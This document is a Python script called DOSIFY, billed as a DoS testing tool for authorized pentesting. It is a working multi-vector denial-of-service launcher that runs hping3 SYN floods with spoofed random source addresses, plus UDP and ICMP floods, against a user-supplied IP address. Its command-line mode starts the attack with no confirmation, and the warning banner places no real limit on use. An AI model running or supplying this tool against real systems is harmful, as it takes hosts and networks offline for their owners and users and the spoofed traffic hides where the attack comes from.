#!/usr/bin/env python3
"""
DOSIFY - Automated DoS Testing Tool
For Authorized Penetration Testing Only
"""

import os
import sys
import time
import threading
import subprocess
import signal
import socket
from datetime import datetime
import argparse

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class DOSIFY:
    def __init__(self):
        self.target_ip = None
        self.attack_processes = []
        self.running = False
        self.start_time = None
        
    def print_banner(self):
        banner = f"""
{Colors.RED}{Colors.BOLD}
██████╗  ██████╗ ███████╗██╗███████╗██╗   ██╗
██╔══██╗██╔═══██╗██╔════╝██║██╔════╝╚██╗ ██╔╝
██║  ██║██║   ██║███████╗██║█████╗   ╚████╔╝ 
██║  ██║██║   ██║╚════██║██║██╔══╝    ╚██╔╝  
██████╔╝╚██████╔╝███████║██║██║        ██║   
╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝        ╚═╝   
{Colors.END}
{Colors.RED}╔══════════════════════════════════════════════════╗
║             AUTOMATED DOS TESTING TOOL           ║
║           For Authorized Pentesting Only         ║
║                  Version 2.0                     ║
╚══════════════════════════════════════════════════╝{Colors.END}

{Colors.YELLOW}⚠️  WARNING: Use only on systems you own or have explicit permission to test{Colors.END}
{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}
"""
        print(banner)

    def validate_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def check_prerequisites(self):
        tools = ['hping3']
        missing = []
        
        for tool in tools:
            if subprocess.call(['which', tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                missing.append(tool)
        
        if missing:
            print(f"{Colors.RED}❌ Missing required tools: {', '.join(missing)}{Colors.END}")
            print(f"{Colors.YELLOW}💡 Install with: sudo apt install {' '.join(missing)}{Colors.END}")
            return False
        return True

    def launch_syn_flood(self):
        cmd = ['hping3', '-S', '--flood', '--rand-source', self.target_ip]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.attack_processes.append(('SYN Flood', process))

    def launch_udp_flood(self):
        cmd = ['hping3', '-2', '--flood', '-d', '1024', self.target_ip]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.attack_processes.append(('UDP Flood', process))

    def launch_icmp_flood(self):
        cmd = ['hping3', '-1', '--flood', '-d', '1024', self.target_ip]
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.attack_processes.append(('ICMP Flood', process))

    def launch_all_attacks(self):
        print(f"\n{Colors.RED}🚀 LAUNCHING DOS ATTACK{Colors.END}")
        
        attack_methods = [
            ("SYN Flood Attack", self.launch_syn_flood),
            ("UDP Flood Attack", self.launch_udp_flood),
            ("ICMP Flood Attack", self.launch_icmp_flood)
        ]
        
        for name, method in attack_methods:
            try:
                method()
                print(f"{Colors.GREEN}✅ {name} launched{Colors.END}")
                time.sleep(0.5)
            except Exception as e:
                print(f"{Colors.RED}❌ Failed to launch {name}: {e}{Colors.END}")
        
        self.running = True
        self.start_time = datetime.now()
        
        print(f"\n{Colors.RED}{Colors.BOLD}🔥 ATTACK ACTIVE 🔥{Colors.END}")
        print(f"{Colors.YELLOW}⚡ Target: {self.target_ip}{Colors.END}")
        print(f"{Colors.YELLOW}⚡ Press Ctrl+C to stop{Colors.END}")

    def stop_attack(self):
        print(f"\n\n{Colors.YELLOW}🛑 Stopping attack...{Colors.END}")
        self.running = False
        
        for name, process in self.attack_processes:
            try:
                process.terminate()
                process.wait(timeout=5)
                print(f"{Colors.GREEN}✅ Stopped {name}{Colors.END}")
            except subprocess.TimeoutExpired:
                process.kill()
                print(f"{Colors.YELLOW}⚠️  Force killed {name}{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}❌ Error stopping {name}: {e}{Colors.END}")
        
        try:
            subprocess.run(['pkill', 'hping3'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        self.attack_processes.clear()

    def signal_handler(self, signum, frame):
        self.stop_attack()
        print(f"\n{Colors.RED}👋 DOSIFY terminated{Colors.END}")
        sys.exit(0)

    def run_interactive(self):
        self.print_banner()
        
        while True:
            try:
                target = input(f"{Colors.CYAN}🎯 Enter target IP address: {Colors.END}").strip()
                if self.validate_ip(target):
                    self.target_ip = target
                    break
                else:
                    print(f"{Colors.RED}❌ Invalid IP address format{Colors.END}")
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}👋 Goodbye!{Colors.END}")
                sys.exit(0)
        
        signal.signal(signal.SIGINT, self.signal_handler)
        
        if not self.check_prerequisites():
            sys.exit(1)
        
        print(f"\n{Colors.RED}⚠️  FINAL CONFIRMATION ⚠️{Colors.END}")
        print(f"{Colors.YELLOW}Target: {self.target_ip}{Colors.END}")
        print(f"{Colors.YELLOW}Attack Type: Multi-vector DoS{Colors.END}")
        
        confirm = input(f"{Colors.YELLOW}Start attack? (y/N): {Colors.END}").strip().lower()
        
        if confirm == 'y':
            self.launch_all_attacks()
            
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            
            self.stop_attack()
        else:
            print(f"{Colors.CYAN}Attack cancelled{Colors.END}")

def main():
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(description='DOSIFY - DoS Testing Tool')
        parser.add_argument('target', help='Target IP address')
        args = parser.parse_args()
        
        dosify = DOSIFY()
        dosify.target_ip = args.target
        
        if not dosify.validate_ip(dosify.target_ip):
            print(f"{Colors.RED}❌ Invalid IP address{Colors.END}")
            sys.exit(1)
        
        signal.signal(signal.SIGINT, dosify.signal_handler)
        dosify.launch_all_attacks()
        
        try:
            while dosify.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        
        dosify.stop_attack()
    else:
        dosify = DOSIFY()
        dosify.run_interactive()

if __name__ == "__main__":
    main()
